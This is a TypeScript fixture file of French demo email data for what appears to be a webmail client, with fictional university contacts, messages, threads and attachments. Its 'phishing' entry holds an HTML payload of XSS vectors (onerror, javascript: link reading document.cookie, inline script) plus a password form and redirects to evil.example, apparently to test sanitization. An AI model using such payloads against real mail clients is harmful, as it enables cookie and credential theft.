/**
 * Jeu de données démo en français — langue source, texte inchangé par rapport à la
 * version historique de mock-fixtures.ts. Utilisé pour `dev@`/`alice@` et pour toute
 * boîte démo dont la langue résolue est `fr` (comportement par défaut).
 */
import type { FixtureLocaleData } from './types'

const fr: FixtureLocaleData = {
  people: [
    'Camille Laurent <camille.laurent@universite.example>',
    'Hugo Bernard <hugo.bernard@universite.example>',
    'Léa Dubois <lea.dubois@universite.example>',
    'Scolarité <scolarite@universite.example>',
    'Nathan Moreau <nathan.moreau@universite.example>',
    'Chloé Petit <chloe.petit@universite.example>',
    'Service informatique <informatique@universite.example>',
    'Inès Garcia <ines.garcia@universite.example>',
  ],

  topics: [
    { subject: 'Planning du projet tutoré 5.01', body: 'Voici le planning mis à jour pour le projet. Les soutenances auront lieu la semaine prochaine.' },
    { subject: 'Compte rendu de réunion', body: 'Merci à tous pour votre présence. Vous trouverez ci-dessous les points abordés.' },
    { subject: 'Changement de salle — cours de jeudi', body: 'Le cours de jeudi aura lieu en salle B204 au lieu de A102.' },
    { subject: 'Rendu du projet web', body: 'Pensez à déposer votre projet sur Moodle avant vendredi 18 h.' },
    { subject: 'Question sur le TP Vue.js', body: 'Est-ce que quelqu’un a réussi à faire fonctionner le routeur avec les paramètres dynamiques ?' },
    { subject: 'Stage : offre en agence', body: 'Une agence locale recherche un·e stagiaire en développement front-end pour le printemps.' },
    { subject: 'Maintenance du serveur mail', body: 'Le webmail sera indisponible samedi de 8 h à 10 h pour maintenance.' },
    { subject: 'Relances absences', body: 'Merci de justifier vos absences auprès de la scolarité dans les plus brefs délais.' },
    { subject: 'Photos de la journée portes ouvertes', body: 'Les photos de la JPO sont disponibles sur le drive du département.' },
    { subject: 'Café ☕ jeudi ?', body: 'On se retrouve à la cafétéria jeudi à 10 h pour parler du projet ?' },
  ],

  greetingOpen: 'Bonjour,',
  greetingClose: 'Bonne journée,',

  newsletter: {
    subject: 'La lettre du campus — septembre',
    text: 'La lettre du campus (version texte).',
    html: '<div style="font-family:Arial;max-width:600px"><img src="https://cdn.example.org/header.png" alt="En-tête" width="600"><h1 style="color:#0b57d0">La lettre du campus</h1><p>Rentrée, projets, événements : toutes les nouvelles du mois.</p><img src="https://cdn.example.org/photo-jpo.jpg" alt="JPO"><img src="https://cdn.example.org/agenda.png" alt="Agenda"><p><a href="https://www.example.org/lettre">Lire en ligne</a></p><img src="https://track.example.org/open.gif?u=dev" width="1" height="1" alt=""></div>',
  },

  phishing: {
    subject: 'Facture impayée — action requise',
    html: '<p>Votre compte sera suspendu.</p><img src=x onerror="alert(1)"><a href="javascript:alert(document.cookie)">Payer maintenant</a><svg><script>alert(2)</script></svg><iframe src="https://evil.example/"></iframe><form action="https://evil.example/steal"><input name="password"></form><style>body{background:url("https://evil.example/p.gif")}</style><meta http-equiv="refresh" content="0;url=https://evil.example">',
  },

  gradeReport: {
    subject: 'Relevé de notes — semestre 4',
    text: 'Bonjour,\n\nVous trouverez votre relevé de notes en pièce jointe.\n\nLa scolarité',
    filename: 'releve-notes-S4.pdf',
  },

  logoMockup: {
    subject: 'Maquette avec logo intégré',
    html: '<p>Voici la maquette avec le logo :</p><p><img src="cid:logo@demo" alt="Logo" width="64" height="64"></p>',
  },

  longSubject: {
    subject: 'Un sujet très long pour vérifier que la liste des messages tronque correctement le texte sans casser la mise en page sur mobile à 320 pixels de large',
    text: 'Texte court.',
  },

  fieldTrip: {
    subject: 'Photos de la sortie',
    text: 'Voici les photos de la sortie au musée, et mes notes.',
    notesFilename: 'notes.txt',
    notesContent: 'Notes de la sortie :\n- musée\n- déjeuner\n',
  },

  meetingConfirm: {
    subject: 'Réunion : merci de confirmer',
    text: 'Bonjour,\n\nMerci de confirmer la lecture de ce message avant la réunion de lundi.\n\nHugo',
  },

  replyThread: {
    subject: 'Re: Planning',
    text: 'Ça me va pour jeudi.\n\n> Le planning proposé : jeudi 14 h.',
    html: '<p>Ça me va pour jeudi.</p><blockquote><p>Le planning proposé : jeudi 14 h.</p><blockquote><p>Message initial.</p></blockquote></blockquote>',
  },

  sentReplyBody: 'Merci, bien reçu !',

  draft: {
    subject: 'Brouillon : idées pour le projet tutoré',
    text: 'Quelques idées à compléter…',
  },

  trash: {
    subject: n => `Ancienne notification ${n}`,
    text: 'Notification supprimée.',
  },

  projects: {
    subject: n => `Projet tutoré — étape ${n}`,
    text: n => `Étape ${n} du projet tutoré.`,
  },

  mailingList: {
    to: 'Liste Promo 2026 <liste-promo2026@universite.example>',
    subject: 'Liste Promo 2026 : réunion de rentrée',
    text: 'Bonjour à toutes et à tous,\n\nLa réunion de rentrée aura lieu mardi à 9 h en amphi.\n\nInès',
    listId: 'Liste Promo 2026 <liste-promo2026.universite.example>',
    listPost: '<mailto:liste-promo2026@universite.example>',
  },

  vcard: {
    subject: 'Carte de visite de Léa',
    text: 'Voici ma carte de visite, pour ton carnet d’adresses.',
    org: 'Université Exemple',
    title: 'Enseignante',
  },

  projectsSubfolder: {
    subject: 'Projet 2026 — cahier des charges',
    text: 'Le cahier des charges du projet 2026 est prêt.',
  },

  archives: {
    subject: 'Archives du semestre 1',
    text: 'Documents du semestre 1.',
  },

  spam: {
    from: 'Gagnant <promo@loterie.example>',
    subject: 'Vous avez gagné un iPhone !!!',
    text: 'Cliquez ici.',
  },
}

export default fr
